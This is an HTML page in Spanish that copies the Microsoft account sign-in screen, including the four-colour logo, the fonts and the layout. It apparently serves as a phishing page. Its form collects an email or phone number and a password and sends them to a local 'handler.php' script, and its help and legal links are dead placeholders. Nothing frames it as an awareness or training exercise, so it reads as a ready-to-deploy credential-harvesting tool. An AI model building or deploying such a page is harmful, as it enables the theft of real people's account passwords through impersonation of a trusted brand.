<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en tu cuenta Microsoft</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #fff;
        }

        .container {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-box {
            max-width: 440px;
            width: 100%;
            padding: 44px;
        }

        .logo {
            text-align: left;
            margin-bottom: 16px;
        }

        .logo-text {
            font-size: 21px;
            font-weight: 600;
            color: #5e5e5e;
        }

        .logo-icon {
            display: inline-block;
            width: 108px;
            height: 24px;
            background: linear-gradient(to right, #f25022 0%, #f25022 25%, #7fba00 25%, #7fba00 50%, #00a4ef 50%, #00a4ef 75%, #ffb900 75%, #ffb900 100%);
            margin-bottom: 8px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 16px;
        }

        .subtitle {
            font-size: 14px;
            color: #1b1b1b;
            margin-bottom: 24px;
        }

        .form-group {
            margin-bottom: 0;
        }

        input {
            width: 100%;
            padding: 11px 12px 13px;
            border: none;
            border-bottom: 1px solid #8c8c8c;
            font-size: 15px;
            background: #f2f2f2;
        }

        input:focus {
            outline: none;
            border-bottom: 2px solid #0067b8;
            background: #fff;
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            margin: 24px 0;
        }

        .checkbox-group input {
            width: auto;
            margin-right: 8px;
            border: 1px solid #8c8c8c;
        }

        .checkbox-group label {
            font-size: 15px;
            color: #1b1b1b;
        }

        .btn-container {
            display: flex;
            justify-content: flex-end;
            margin-top: 24px;
        }

        .btn-primary {
            padding: 10px 40px;
            background: #0067b8;
            color: white;
            border: none;
            font-size: 15px;
            cursor: pointer;
        }

        .btn-primary:hover {
            background: #005a9e;
        }

        .links {
            margin-top: 24px;
        }

        .links a {
            color: #0067b8;
            text-decoration: none;
            font-size: 13px;
        }

        .links a:hover {
            text-decoration: underline;
        }

        .footer {
            margin-top: 32px;
            display: flex;
            justify-content: space-between;
            font-size: 11px;
            color: #616161;
        }

        .footer a {
            color: #616161;
            text-decoration: none;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <div class="logo-icon"></div>
            </div>
            <h1>Iniciar sesión</h1>
            <form action="handler.php" method="POST">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Correo electrónico, teléfono o Skype" required
                        autofocus>
                </div>
                <div class="links">
                    <a href="#">¿No tienes una cuenta? Crea una.</a>
                </div>
                <div class="form-group" style="margin-top: 24px;">
                    <input type="password" name="password" placeholder="Contraseña" required>
                </div>
                <div class="links">
                    <a href="#">¿Has olvidado tu contraseña?</a>
                </div>
                <div class="checkbox-group">
                    <input type="checkbox" id="remember">
                    <label for="remember">Mantener la sesión iniciada</label>
                </div>
                <div class="btn-container">
                    <button type="submit" class="btn-primary">Siguiente</button>
                </div>
            </form>
            <div class="footer">
                <a href="#">Términos de uso</a>
                <a href="#">Privacidad y cookies</a>
            </div>
        </div>
    </div>
</body>

</html>
